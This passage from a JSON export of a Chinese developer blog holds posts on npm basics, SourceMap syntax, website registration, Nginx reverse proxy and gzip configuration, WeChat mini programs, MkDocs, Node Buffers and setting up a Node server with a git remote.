之后就能在浏览器中看到效果了，本网站已经开放了简易聊天室了，可以直接移步这里看demo，WebSocket聊天室。 遇到的坑以及解决方法nodejs原生http模块的困惑socket.io教程里面有一段这样的代码 1234var http = require(‘http’).Server(app);http.listen(3000, function()&#123; console.log(‘listening on *:3000’);&#125;); 不难理解就是3000端口启动一个http服务，但是通过express cli 生成的./bin/www里面的代码也存放这启动http服务的代码，代码是这样的： 12345var http = require(‘http’);var port = normalizePort(process.env.PORT || ‘3000’);app.set(‘port’, port);var server = http.createServer(app);server.listen(port); 这时候俺就震惊了，同是Require的http，为毛启动一个服务会有两种createServer()和Server()两种？你去查nodejs官方文档，发现也只有第一种，那么第二种是什么鬼？ stackoverflow上给出了答案，其实这时候就得翻nodejs的源码了，源码在这里nodejs http模块，仔细看下第1903行到1905行，就能明白在实现过程中遇到的困惑了。不过从上面的url上可以看到github上看代码的一个小技巧，url后面hash值接L50-L60的意思就是浏览器可以直接定位第50行到60行。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"NPM必须掌握的基础概念","slug":"NPM必须掌握的基础概念","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/NPM必须掌握的基础概念/","link":"","permalink":"http://chucz.club/2017/03/22/NPM必须掌握的基础概念/","excerpt":"This is a summary","text":"This is a summary 什么是npm？npm其实就是一个包管理器，是方便JavaScript开发者分享和复用代码而诞生的，现在npm上面已经有丰富的module供开发者使用了，对于开发者这是一种新的共享和复用代码的方式，而且还能更方便的维护各种代码版本之间的关系。 安装npm一般只要安装nodejs之后，npm也会自动安装成功，如果npm版本太低，可以执行下面的命令进行npm版本的更新： $ sudo npm install npm -g `&lt;/pre&gt; npm上发布的包，基本都可以通过下面这个链接看到每个包的具体信息情况： [https://registry.npmjs.org/XXX（XXX是包的名字）](https://registry.npmjs.org/XXX（XXX是包的名字）) 例如[memwatch](https://registry.npmjs.org/memwatch)的各种历史版本信息(一个nodejs的内存监控工具)。 npm install是一个经常会用到的命令，–save和–registry参数也会经常使用 &lt;pre&gt;`$ npm install XXX --save --registry=XXX `&lt;/pre&gt; –save的意思：安装完成之后，会自动写入到你的packjson.json的dependencies里面。 –registry的意思：你这个包可以从哪个源来下载，不加这个参数的时候默认是从[npm](https://www.npmjs.com/)上面来下载，但是由于GFW的原因，有时候可能会下载失败，这时候我们也可以添加国内的镜像，例如：[淘宝的](https://npm.taobao.org/)，[美团的](https://npm.sankuai.com/)，淘宝的的镜像每隔10分钟会与官方服务器同步一次，用淘宝的源一般不会安装失败。 卸载某一个包就是把install换成uninstall就好了 ## [](#npm-发布自己的module &quot;npm 发布自己的module&quot;)npm 发布自己的module 基本的步骤如下： &lt;pre&gt;`$ npm login $ npm init $ npm config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; scope username $ vim /{project}/{index.js} $ npm publish --access=public /*--access=public参数是选择性的，如果不添加则该package只能指定用户看到*/ `&lt;/pre&gt; 自己的module如何进行更新，动态版本号是npm的一个比较方便的约定，分为三种，patch，minor，major，举个例子： Patch releases: 1.0 or 1.0.x or ~1.0.4，顾名思义patch就是补丁的意思，更新的是第三位数字 Minor releases: 1 or 1.x or ^1.0.4，Minor意思是较少的，更新的是第二位数字 Major releases: * or x，Major意思是主要的意思，更新的是第一位数字那么问题来了，当你的一个npm package进行了一些补丁修复或者是主要的更新之后，怎么样生成新版本号，执行下面的命令就可以了： `$ npm version patch $ npm version minor $ npm version major ` 与此同时package.json里面的版本号就会动态更新了。node.js 的模块管理中，最常用到的几种动态版如下： *: 任意版本 1.1.0: 指定版本 ~1.1.0: &gt;=1.1.0 &amp;&amp; &lt; 1.2.0 ^1.1.0: &gt;=1.1.0 &amp;&amp; &lt; 2.0.0 其中 ~ 和 ^ 主要有两种前缀，简单的来说：~ 前缀表示，安装大于指定的这个版本，并且匹配到 x.y.z 中 z 最新的版本。^ 前缀在 ^0.y.z 时的表现和 ~0.y.z 是一样的，然而 ^1.y.z 的时候，就会 匹配到 y 和 z 都是最新的版本。特殊的是，当版本号为 ^0.0.z 或者 ~0.0.z 的时候，考虑到 0.0.z 是一个不稳定版本， 所以它们都相当于 =0.0.z。 ~其实就是从尾部开始限制序号（0除外），^其实就是从头部开始限制序号（0除外）。 还有一种情况是2.1.*是指major和minor固定，patch是任意的. 如果实在想不明白请移步这里semver,这个npm package可以帮你，下面也有详细的注释讲版本号到底应该怎么算的。 npm 增加 tagsnpm publish 默认是发布的最新版本，如果参数增加–tag {name}，则该版本就有了{name}的一个代号，这样如果npm install的时候就可以安装某个代号版本的npm package。 `$ npm publish –tag beta$ npm install somepkg@beta 上面这些知识点基本可以算是npm 入门必备知识了，后续会陆续更新npm进阶知识。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Javascript SourceMap syntax changed","slug":"Javascript-SourceMap-syntax-changed","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/Javascript-SourceMap-syntax-changed/","link":"","permalink":"http://chucz.club/2017/03/22/Javascript-SourceMap-syntax-changed/","excerpt":"This is a summary","text":"This is a summary Javascript SourceMap 简介SourceMap的入门知识请移步阮一峰之前写的JavaScript sourceMap详解,这里不做太多的入门介绍，总的一句话，这破玩意就是在压缩后的js代码最后加入”//@ sourceMappingURL=jquery.min.map”一行代码，作用呢说起来也很简单，就是能帮你找到你检查的某句代码在哪个文件，第多少行，举个 🌰 ：点击后面这个链接进入Sourcemap demo,里面就是你选中代码里的一段，右键选择get origin location，上面的Output框里面就打印出来你选中的代码在哪个文件的第多少行。 Syntax changedSourceMap是谷歌出的，现在也更新到了第三版，以前都是”//@ sourceMappingURL=XXX.min.map”这么加，现在如果还是这么写的话，Chrome控制台就会报一个这样的错，”/@ sourceMappingURL=” source mapping URL declaration is deprecated, “/# sourceMappingURL=” declaration should be used instead。这个是最近看美团i版线上控制台出现的，以前也没有，其实就是把之前的@号变成#好就好了，源于Google Developer的文档。 扩展阮一峰的文章里面说最常用的方法是使用Google的Closure编译器，链接进去之后也不知道那是什么鬼，看底下的介绍说拿java执行一个命令就能生成sourcemap文件，前端工程师用什么java，后又在google上搜看到一篇比较靠谱英文的文章，仔细原来峰哥就是把那篇文章翻译过来了，链接在这Html5rocks SourceMap，估计他自己也没亲自试验过吧 😓，于是自己还是不清楚怎么来生成，哥觉得自己在研究一下，遂明白，Grunt和Gulp都有uglify的插件，uglify可以选择性的生成sourcemap，请移步uglify 2，里面有详细的说明怎么样生成sourcemap。 总结总之一句话，直接搬过来翻译一下还是不太好😄，盲目照搬照抄没自己的观点也不行哈，毕竟现在是一个多元化的社会。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"备案那些事","slug":"备案那些事","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-30T02:32:04.798Z","comments":true,"path":"2017/03/22/备案那些事/","link":"","permalink":"http://chucz.club/2017/03/22/备案那些事/","excerpt":"This is a summary","text":"This is a summary 服务器准备一台sever，有人会说配置好一点的贵，还不如申请一些免费或者便宜的国外VSP的什么之类啊blah，blah。。还省钱，然后买个域名就好了，什么个人博客其实也够用了。当然一分价钱一分货，你把服务国外自然访问起来各种慢啦，难得我团之前发福利，领了个云主机的1000块的券，终于能省下一笔钱了，买了个1核2G的美团云服务器，哈哈哈…总之我团的服务器性价比其实还可以哈，客服各方面处理的还是挺快的，也不是因为自己公司员工的关系来做广告，总之提工单处理速度还是客服咨询还是解答回复的很快，各种端口异常，服务故障，端口恢复还是能比较及时的短信告知你本人的，就算我这里给打个广告了… 域名域名这里比较坑爹，反正国外最大的域名贩卖商就是那个 🐶 Daddy(goDaddy)，国内阿里的万网等等，当然阿里云和万网都一整套的，什么域名服务器你也可以一气都在那上面解决了，阿里云还有什么node服务监控等等，你网上随便搜搜也能搜到一大堆，当时好多人都会吹🐶Daddy多么多么好，多么多么靠谱，当然你要是用国外的VPS或者服务器，也不影响啥，各种炫酷域名后缀，什么.name .me .us .biz.info,随便你挑，总之指到你服务上去就行。但是！在国内，你不能那么任性！你不能那么任性！你不能那么任性！重要事情说三遍，一定要先看下这个链接全国备案基本要求，因为偶自己在 🐶 Daddy买了个.info的炫酷域名，结果根本就满足不了北京的备案要求。如果你想在国内备案的话，当然国内备案虽然麻烦也有国内的优势，你想让你的网站访问很流畅并且就是面向国内的用户的话，还是老实的去备案吧，不过值得注意的一点，其实备案主要是针对放到公网服务器的备案，这点你必须得清楚，只不过域名是有一些要求，具体的还是看上面“全国备案基本要求”那个链接，总体来说还是越发达的省市要求的条件越苛刻，比如北京，那些个性域名直接就不可能通过，所以那些个性域名卖的比正常的便宜很多，一分价钱一分货！还是那个道理。即便你是.com域名，如果是🐶 Daddy上买的，不行！你必须要把域名转入到国内的服务商下面，你还得做转入转出，总之还是像最开始说了，直接万网上直接一下都搞得最好了。 备案备案流程其实有点麻烦，不过还好国内的阿里云，美团云，青云之类的都能免费提供备案服务，但是虽然是给提供服务还是要麻烦你搞一些东西，网站上提申请，要填一下个人信息，你网站的内容主题等等，当然主题里面最好不要有“博客”这样比较敏感的关键词，之后审核通过了，会给你邮寄幕布，然后让别人拿着幕布给你拍张照片，在给服务商邮寄回去，提交你的照片，身份证复印件等等，然后代办的服务商在帮你提交申请，大约需要等个半个月，如果没啥问题的话，基本就能批下来了，到时候给你个备案号还有初始密码，可以在网上查到是认证过的，之后还会时不时给你发短信让你确认一下你的域名是否真的在你所提供信息的人的下面。既然我团云能给帮忙代办，我就省了好多事情，信息网上填了，提交通过后，公司同事让我去照相，我颠不颠过去拉个幕布照完之后，等就行了，省去了不老少麻烦的邮寄材料环节。 结语最后，还是建议在国内备案吧，随便搞一下在国外那种的挺没啥劲的，各种不稳定，顺便结尾在吐槽一下🐶Daddy网站的用户体验有多么烂，其实这些年国内的互联网公司真的发展的挺快的，至少有些的各方面都远超美利坚，就比如我的美国Teacher看到国内年轻人能拿手机app点餐就会觉得灰常灰常的Amazing的，对于这样我也是只能内心呵呵一笑，其实有时候国人更应该多一些自信的… 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"参加Velocity-2016感受和收获","slug":"参加Velocity-2016感受和收获","date":"2017-03-22T04:47:34.000Z","updated":"2018-09-29T10:11:30.773Z","comments":true,"path":"2017/03/22/参加Velocity-2016感受和收获/","link":"","permalink":"http://chucz.club/2017/03/22/参加Velocity-2016感受和收获/","excerpt":"This is a summary","text":"This is a summary Velocity会议是干什么的？自2008年以来Velocity会议持续不断汇集了不同行业背景的人才，他们在Web性能、运维、开发运维方面做出了令人惊奇的工作，通过不断的分享，给其他的企业和开发者带来福音，刚开始的前几届都是在国外举办，Velocity能走进中国，离不开阿里巴巴做出的努力，阿里的同学第一次国外参加Velocity之后，收益良多，于是通过一些资金上的赞助和支持，把Velocity引入了中国，并且中国的大会也不断的有很多优秀的中国互联网公司的同学去当讲师，分享他们在工作中做出优秀的技术贡献和解决方案。 参加Velocity-2016的感受第一次参加Velocity，其实还是收获挺多的，两天不间断的分享，分享后的头脑风暴，不断的让我去思考自己在工作中对技术层面的认知，真切的让我们感受到这几年中国互联网公司的崛起，以BAT为代表的大公司不断的引进国外的先进技术，结合公司自己业务的实际情况，进行改造在创新，比如阿里巴巴的Weex，手机百度在RN上的实践等，基本上已经不再只是拿来主义，都会根据自己的业务使用当中遇到的问题进行优化再创新，尤其是阿里的Weex，双11天猫App从主会场到各个分会场3000+的活动，全部已经是拿Weex实现了，在开发原生App和H5&amp;Webview内嵌之间寻找最优性能体验和开发效率的平衡点，其实对于这样运营活动是在合适不过的解决方案了。 2016Velocity大会大致有国人场和老外场两种，其实最后听下来还是国人的分享比较实在，相对分享的干货比较多，也能感觉到国内互联网公司很多的进步，反倒是一些老外的分享，以及一些国内的外企同学的分享，滥竽充数，到了提问环节不断被下面的同学进行质疑，问到打脸。😆 总体来说我听的基本都是前端领域的分享，从技术角度讲，但大致分为两大类: 第一类是某种技术框架在实际业务中的运用结合着性能优化； 第二类是服务质量图表数据上报的重新思考. 第一类就是我刚才提到的阿里Weex结合双11的性能优化，手百的RN性能优化，QQ空间H5Webview的性能优化，构建下一代移动网页应用(PWA)，百度搜索MIP容器(搜索全链路性能体验优化)等，第二类是重新思考服务质量，性能魔方的应用性能数据可视化等。仔细想来，其实这两类事情是相辅相成互相结合的，只有第二种数据上报监控做好了，才能结合详细的数据图表做更针对的性能优化，一些具体的技术细节我就不再这里单独详细写了，后续可能会做个分享在大组内进行分享，如果哪位同学想看之后我分享的幻灯片，可以私聊我。 总结总得来说Velocity2016还是挺不错的，两天听下来，干货挺多真的很累，比上班还累，一天听8~9个分享，一直都在集中精力听不断的去消化思考和反思，可能这样的过程就是一种进步吧😀 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Nginx反向代理","slug":"Nginx反向代理","date":"2017-03-21T22:39:50.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2017/03/21/Nginx反向代理/","link":"","permalink":"http://chucz.club/2017/03/21/Nginx反向代理/","excerpt":"This is a summary","text":"This is a summary 引言网上讲Nginx的文章也很多，各种入门的深入的也都有，这里不做太多过深的研究，只是罗列一下我在配置过程中遇到的问题以及如何解决的。 反向代理代理估计大家也都知道是什么意思，按照字面意思反向代理的意思也不难理解，Nginx作为一个高性能的HTTP和反向代理服务器，现在已经被各大互联网公司采用，也可以作负载均衡，它的性能各方面比Apache优势要明显很多，所以这也是它现在这么受欢迎的原因。 端口的转发如果你的Server不安装Nginx，那么备案之后，以及默认配置，外网访问的都是80端口，当然你也可以把服务启动起来，指定80端口就好了，外面用户敲域名回车也能访问你的网站。但是如果一台Server想通过多个不同端口启动多个服务，配置很多的子域名打到对应的端口的服务的时候，Nginx就必须搞起来了。 安装Nginx一般新买的服务器都会有Yum环境，如果没有，自行安装下，Yum命令是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，主要是方便系统管理人员更精细化更快速的管理和安装各种软件包，Yum环境有了之后，就可以按照这个链接Nginx安装教程给的教程安装了。 增加子域名域名在哪里买的，就去那个服务商网站登录，进入域名解析设置里面，多设置一个A记录类型，主机记录是你起的子域名名称(举个 🌰 ：你设成abc，那么你就有了一个abc.domain.com的子域名)，然后记录值还是你的Server的公网ip地址，TTL选择最短的时间，然后保存，一般很快就能生效了，这样你就给你的域名开了一个新的子域名。 Nginx.conf如何配置举个 🌰 ，就拿我自己的站点来说，除了默认的codefilled.com和www以外，我还有一个m.codefilled.com的子域，现在我想启动两个服务，端口号一个是4000和3000，主站服务端口号4000（但是用户默认访问的是80），m站的端口指到3000端口上面启动的服务，这样的需求，Nginx应该如何配置，可以看一下下面的配置代码: 123456789101112131415161718192021include /etc/nginx/conf.d/.conf;server_names_hash_bucket_size 64;server &#123; listen 80 default_server; listen [::]:80 default_server; server_name codefilled.com www.codefilled.com; /配置多个，也可以拿正则来匹配，例如：www. / # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; proxy_pass http://127.0.0.1:4000; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125;&#125; *注：上面的配置是监听的80端口，3w和没有3w的80统一都转发到4000端口的服务，server_names_hash_bucket_size 64 增加这行的原因是添加多个server_name之后，保存Nginx配置会提示server_names_hash_bucket_size不足，把size变大之后就能解决，如果64不够，你再用128这样就可以了。 12345678910server &#123; listen 80; server_name m.codefilled.com; include /etc/nginx/default.d/*.conf; location / &#123; proxy_pass http://127.0.0.1:3000; &#125;&#125; *注：上面这是配置是把m站的80端口代理到3000。 修改完etc/nginx/nginx.conf之后，保存，执行下面的命令: 1$ nginx -s reload 就能生效了，然后启动各自服务的守护进程，就能正常访问了。 Nginx配置整站gzip压缩gzip是一种改进web应用程序性能的一种压缩技术，大流量的WEB站点常常使用GZIP压缩技术来让用户感受更快的速度。这一般是指服务器中安装的一个功能，当有人来访问这个服务器中的网站时，服务器中的这个功能就将网页内容压缩后传输到来访的电脑浏览器中显示出来。一般对纯文本内容可压缩到原大小的40%左右。这样传输就快了，效果就是你点击网址后会很快的显示出来。配置的代码如下： 123456789# open gzipgzip on;gzip_min_length 1k;gzip_buffers 4 16k;# gzip_http_version 1.0;gzip_comp_level 2;gzip_types text/plain application/x-javascript application/javascript text/css application/xml text/javascript image/jpeg image/jpg image/png image/gifgzip_vary on;gzip_disable “MSIE [1-6].“; 大致意思就是开启gzip，大于1K的才进行压缩，压缩级别1-10，压缩类型js、主文档、jpg、png、css、gif，IE1~6对gzip支持不好，关闭。 查看Nginx哪些端口被占用执行 $ss -tnl 12345678910$ss -tnlState Recv-Q Send-Q Local Address:Port Peer Address:PortLISTEN 0 128 :80 :LISTEN 0 128 :22 :LISTEN 0 100 127.0.0.1:25 :LISTEN 0 128 :4000 :LISTEN 0 128 :::8080 :::LISTEN 0 128 :::80 :::LISTEN 0 128 :::22 :::LISTEN 0 128 :::3000 :::* 就能看到结果列表了 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"关于微信小程序的思考","slug":"关于微信小程序的思考","date":"2016-10-01T05:44:52.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2016/10/01/关于微信小程序的思考/","link":"","permalink":"http://chucz.club/2016/10/01/关于微信小程序的思考/","excerpt":"This is a summary","text":"This is a summary 引言好久不写文章了，手都有点生了😄，距离上一篇文章时隔一个月多了，原因有两个：一.八月份的确业务多，实在太忙；二.九月份又忙着职级答辩，毕竟答辩还是比博客重要的嘛，哈哈哈😁。9月底微信出了一个新的功能：微信小程序，引爆各大互联网媒体渠道，分析的文章一篇接一篇，大多数人都是觉得，哇塞这是颠覆性的东西呀，有了APP的功能而且用JS就能开发了，再加上微信的流量，简直是各种骗点击啊，周围的人各种在分享，唱衰的几乎没有，冷静能独立来思考的不多，推荐一个微信公众号：“独立思考”，里面那位同学写的关于小程序的思考， 还是比较客观公正的，在这个基础上，我自己也站在产品技术层面进行了深入的思考，公司其他部门，尤其是猫眼电影，大老板From腾讯，我们还是得到了不少关于小程序的信息，总体来说和我分析一些还是相互印证，下面就来讲讲我自己在微信小程序上的看法和认识😂，在这里献丑了… 对于微信的思考下面我用总结的四句话来概括一下： 我们和微信斗争多年 常年在博弈中度日 人们经常想从微信中收益 一切的最终解释权归微信… 自从微信用户量破了几亿之后，越来越多的人都想从微信这个渠道获取新的用户，新的流量，想尽一切办法和手段去牟利，而微信一直想保持自己“纯洁”的净土，这些年也是不断的和推广者之间进行博弈，举几个我自身遇到的🌰，之前在猫眼做分享电影红包，渠道就是通过微信来传播，刚上线，各种转发，没过多久，超过微信的分享转发的阈值，URL无法访问，后续微信还出过更绝的办法，你分享成功后，你自己可以看见，其他好友看不见，有一段时间滴滴专车券也被弄了，大客户该跪也得跪😂，最开始人们还以为是分组可见呢，呵呵呵🙄，微信这么任性，我也真是醉了.. 于是： 微信公众号刷阅读量封号❌ 分享数量过大❌ 诱导分享❌ 内容违法❌&gt; 微信内嵌H5用户体验差推出了小程序 那么疑问就来了： 我们照搬外卖APP的功能赶第一波红利，微信审核通不过怎么办？ 那么我们真的要把全部APP的功能搬上去吗？ 如果想不清楚这些问题，不妨站在微信的产品设计思路去想想，微信的产品设计原则，大概可以从下面四点来概括： 极简 极致体验 安全 严格审核 微信功能很多，但是仍然很简单易用，并且体验好，很少出现安全隐患，内容审核严格。 目标：只有站在微信产品的角度去思考设计我们的产品，才能获得微信的青睐。 对于产品层面的思考据传言说微信APP会在游戏的下方开一个入口，那于是我们可以参考当时游戏的情况，曾经🔥到不行的打✈️游戏，如今还有谁在玩，现在看一下游戏首页的游戏，经典的开心消消乐，并且以前是独立APP有群众基础的保卫萝卜，一句话概括可以说明： “红利过后，片甲不留..” 那么于是反思我们的目标： 外卖的目标：为用户持续提供高品质且稳定的外卖配送服务。外卖小程序的目标：我们需要通过不断的思考优化做出一个微信都能认可的精品。 反思出我们的目标之后，是否就应该想想，我们通过微信会带来一些用户，其中一部分是重叠用户，还有一部分待挖掘用户，那么这部分待挖掘的用户，如何在微信里面释放他们的潜力，让他们转化成我们忠实的用户，这也是值得思考的一个问题。微信的小程序可以算的上一个平台，一个独立于原生APP，独立于H5的一个平台，那么这样一个新平台和老平台之前从用户体验、获取新客成本、用户留存、开发速度这四个方面应该是怎么样的呢？看下下面的表格，这是我根据经验得出的大致判断： 手机APP微信小程序移动H5站用户体验最好中较差新客成本最高中最低用户留存最高较低?较差开发速度较慢中快 待定的技术层面待完善…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"MkDocs快速搭建","slug":"MkDocs快速搭建","date":"2016-06-06T23:06:27.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2016/06/06/MkDocs快速搭建/","link":"","permalink":"http://chucz.club/2016/06/06/MkDocs快速搭建/","excerpt":"This is a summary","text":"This is a summary MkDocs是什么?MKDocs就是一个能快速，简单，优雅的生成静态文档站点的项目。文档用Markdown书写，目录用YAML配置，弄好之后你可以把它放到Github的Pages 上，或者自己服务器上就可以了。并且也有好几套UI供你选择MkDocs UI，特别适合那些做开源项目的童鞋，生成说明文档使用。总的来说，就是省时省力，效果还不错。 安装前提你电脑上已经有了Python，以及Python的包管理器Pip，一般都会有Python环境，Pip不一定有，Pip的安装移步这里Pip Install，进去之后你会发现其实Pip的这个说明文档，也是用这个鬼（MkDocs）做的，其实还是很多人都在用的吧。。😄这里提一嘴，你的新建一个get-pip.py文件，从上面的安装教程里面下载一段Python代码拷进去，然后执行下面命令，Pip才能安装成功 &lt;span class=&quot;variable&quot;&gt;$sudo&lt;/span&gt; python get-pip.py /* 最好加上sudo，否则最后有可能某些文件权限不够安装失败*/ &lt;span class=&quot;variable&quot;&gt;$pip&lt;/span&gt; --version pip 1.5.2 `&lt;/pre&gt; Pip安装成功之后，接着安装Mkdocs，执行下面的命令 &lt;pre&gt;`&lt;span class=&quot;variable&quot;&gt;$sudo&lt;/span&gt; pip install mkdocs /* 最好加上sudo，否则最后有可能某些文件权限不够安装失败*/ &lt;span class=&quot;variable&quot;&gt;$mkdocs&lt;/span&gt; --version mkdocs, version 0.15.2 `&lt;/pre&gt; ## [](#开始 &quot;开始&quot;)开始 准备工作做完了，就可以开始了，执行下面命令： &lt;pre&gt;`&lt;span class=&quot;variable&quot;&gt;$mkdocs&lt;/span&gt; new my-project &lt;span class=&quot;variable&quot;&gt;$cd&lt;/span&gt; my-project $ mkdocs serve Running at: http://127.0.0.1:8000/ `&lt;/pre&gt; 这时候就可以在本地8000端口看到了，进入my-project，会有一个doc目录和一个mkdocs.yml文件，.yml就是配置文件，配置如下： &lt;pre&gt;`site_name: Mkdocs pages: - Home: index.md - About: about.md /*在doc目录下新建.md文件就好了，冒号前面的key会自动生成目录名称*/ theme: readthedocs /*选择了readthedocs主题*/ `&lt;/pre&gt; 上面这个配置基本就是[Pip Install](https://pip.pypa.io/en/stable/installing/)和这个效果差不多的，我这里就不给demo了，您也可以按照上面的教程实现以下，其实就是这个链接的效果。 也可以进行以下其他的操作，例如： &lt;pre&gt;`&lt;span class=&quot;variable&quot;&gt;$mkdocs&lt;/span&gt; build /*生成网站的site目录，里面有一些静态资源*/ &lt;span class=&quot;variable&quot;&gt;$mkdocs&lt;/span&gt; build --clean &lt;span class=&quot;variable&quot;&gt;$mkdocs&lt;/span&gt; --help 结语总之，这还是一个比较方便的工具，还是那句话，特别适合开源项目快速撰写文档，或者API接口文档等，如果没记错的话，点评的内部一些文档，也是用的类似工具快速生成的。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Nodejs缓冲模块Buffer基础","slug":"Nodejs缓冲模块Buffer基础","date":"2016-06-01T05:42:58.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2016/06/01/Nodejs缓冲模块Buffer基础/","link":"","permalink":"http://chucz.club/2016/06/01/Nodejs缓冲模块Buffer基础/","excerpt":"This is a summary","text":"This is a summary nodejs Buffer模块简介在nodejs中，Buffer模块是和Node内核一起发布的核心模块，Buffer模块可以让nodejs处理二进制数据，一个Buffer类似一个整数数组，但是它不存在V8堆内存内，大家知道一般32位系统V8引擎大概。会用掉0.7G的内存，64位的系统大概会用掉大约1.4G的内存，这都是给V8用的内存空间，是堆内内存，但是Buffer是堆外的，不会和V8公用一处内存的，这点必须要要清楚。 Buffer支持的几种编码格式 ‘ascii’ - 仅用于 7 位 ASCII 字符。这种编码方法非常快，并且会丢弃高位数据。 ‘utf-8’ - 多字节编码的 Unicode 字符。许多网页和其他文件格式使用 UTF-8。 ‘ucs2’ - 两个字节，以小尾字节序(little-endian)编码的 Unicode 字符。 ‘base64’ - Base64 字符串编码。 ‘binary’ - 将原始二进制数据转换成字符串的编码方式，仅使用每个字符的前8位。这种编码方法已经过时，应当尽可能地使用Buffer对象。Node 的后续版本将会删除这种编码。 Buffer的基本使用Buffer主要分为三个部分，创建Buffer，读取Buffer，写入Buffer， 🌰 如下： 创建Buffer12var a = new Buffer(10); / 新建Buffer /console.log(a); 未完待续…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"快速搭建Node服务器","slug":"快速搭建Node服务器","date":"2016-05-13T05:42:23.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2016/05/13/快速搭建Node服务器/","link":"","permalink":"http://chucz.club/2016/05/13/快速搭建Node服务器/","excerpt":"This is a summary","text":"This is a summary 准备工作一台sever，配置自己定nodejs安装包，下载地址：http://nodejs.org/dist/v4.4.2/node-v4.4.2.tar.gz (暂时稳定版本) 安装步骤12345678910$ cat /etc/system-release CentOS release 6.1 (Final) $ locale LANG=en_US.UTF-8 …$ wget http://nodejs.org/dist/v4.4.2/node-v4.4.2.tar.gz$ tar zxvf node-v4.4.2.tar.gz $ cd node-v4.4.2.tar.gz $ ./configure –prefix=/usr $ make $ make install 安装express1234567$ npm -g install express forever supervisor$ sudo npm install -g express-generator$ express app install dependencies:$ cd app &amp;&amp; npm install run the app:$ DEBUG=app:* npm start OR npm start sever端搭建git仓库在sever端安装好git之后，客户端往服务端push代码会报错，类似如下错误： 1234567891011121314remote: error: refusing to update checked out branch: refs/heads/masterremote: error: By default, updating the current branch in a non-bare repositoryremote: error: is denied, because it will make the index and work tree inconsistentremote: error: with what you pushed, and will require ‘git reset –hard’ to matchremote: error: the work tree to HEAD.remote: error: remote: error: You can set ‘receive.denyCurrentBranch’ configuration variable toremote: error: ‘ignore’ or ‘warn’ in the remote repository to allow pushing intoremote: error: its current branch; however, this is not recommended unless youremote: error: arranged to update its work tree to match what you pushed in someremote: error: other way.remote: error: remote: error: To squelch this message and still keep the default behaviour, setremote: error: ‘receive.denyCurrentBranch’ configuration variable to ‘refuse’. 执行下面的命令解决该问题： 1$ git config receive.denyCurrentBranch ignore 以后客户端push代码之后，服务端同步更新只要在sever端执行 git pull 就可以更新成最新代码。","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]}]}